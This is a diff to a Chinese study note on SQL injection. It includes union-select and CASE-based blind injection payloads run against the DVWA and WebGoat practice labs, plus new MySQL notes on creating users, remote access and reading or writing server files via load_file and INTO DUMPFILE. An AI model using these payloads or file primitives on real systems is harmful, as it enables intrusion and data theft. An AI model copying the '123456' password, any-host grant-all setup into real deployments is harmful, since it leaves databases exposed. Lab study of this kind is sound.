@@ -112,6 +112,7 @@ mysql 5.0之后，有了 INFOMATION_SCHEMA ，它可以获取数据中所有的�
 
 例如dvwa中盲注sql页例子：```1' union select table_name ,1 from information_schema.tables where '1'='1```
 结果如下：
+
 ```
 ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
 First name: admin
@@ -432,6 +433,84 @@ CHARACTER_MAXIMUM_LENGTH: 255
 ```GET http://10.10.10.128:8080/WebGoat/SqlInjection/servers?column=(case+(select+ip+from+servers+where+hostname%3d'webgoat-prd')+when+%27100.130.219.202%27+then+hostname+else+id+end) HTTP/1.1```
 
 最后发现ip为104.130.219.202
+
+## mysql 的一些常用操作
+
+### 增加用户
+
+- 添加新用户，并允许本地 IP 访问 localhost, 127.0.0.1
+
+`create user 'test'@'localhost' identified by '123456';`
+
+- 允许外网 IP 访问
+
+`create user 'test'@'%' identified by '123456';`
+
+- 刷新授权: `flush privileges;`
+
+- 为用户创建数据库: `create database test DEFAULT CHARSET utf8 COLLATE utf8_general_ci;`
+
+- 为新用户分配权限, 授予用户通过外网IP对于该数据库的全部权限
+
+```
+grant all privileges on `testdb`.* to 'test'@'%' identified by '123456';
+```
+
+- 授予用户在本地服务器对该数据库的全部权限
+`grant all privileges on `testdb`.* to 'test'@'localhost' identified by '123456';`
+
+- 刷新权限: `flush privileges;`
+- 退出 root 重新登录: `exit`
+- 用新帐号 test 重新登录，由于使用的是 % 任意IP连接，所以需要指定外部访问IP, `mysql -u test -h 115.28.203.224 -p`
+
+在Ubuntu服务器下，MySQL默认是只允许本地登录，因此需要修改配置文件将地址绑定给注释掉：
+```
+# Instead of skip-networking the default is now to listen only on
+# localhost which is more compatible and is not less secure.
+#bind-address		= 127.0.0.1		#注释掉这一行就可以远程登录了
+
+```
+不然会报如下错误：
+ERROR 2003 (HY000): Can't connect to MySQL server on 'host' (111)
+
+### mysql下读取文件和写文件的方法
+
+mysql服务端的文件读取有很多的条件限制，主要是mysql数据库的配置，为了安全原因，当读取位于服务器上的文本文件时，文件必须处于数据库目录且可被所有人读取。
+
+可以在mysql命令控制台执行`show variables like '%secure%'` 来查看。会列出`secure_auth`和`secure_file_priv` , 然后使用`select @@secure_file_priv`查看内容。
+
+
+参数是用来限制LOAD DATA,SELECT ... OUTFILE,DUMPFILE和LOAD_FILE()可以操作的文件夹。
+
+`secure-file-priv` 的值可以分为三种情况：
+- 值为null，表示显示mysqld不允许导入|导出;
+- 值为/tmp/，表示限制mysqld的导入|导出只能发生在/tmp/目录下，此时如果读写发生在其他文件夹中，就会报错;
+- 没有具体值，表示不对mysqld的导入|导出做限制。
+
+除此之外，读取或写入文件必须拥有可操作的用户权限否则会报错。ERROR 1045 (28000): Access denied for user
+
+
+#### 读取文件
+
+- load_file()
+
+例如：`select load_file("文件路径") as result;`
+
+- load data infile
+
+例如：
+```
+create database somedb;
+create table sometable(id TEXT,content TEXT);
+load data infile "文件路径" into table somedb.sometable FIELDS TERMINATED BY '\n\r';
+```
+#### 写文件
+
+- INTO DUMPFILE "文件路径"
+
+`select group_concat(user_name) from user INTO DUMPFILE "/var/lib/mysql-files/aaa";`
+
+
 
 ## 工具
 
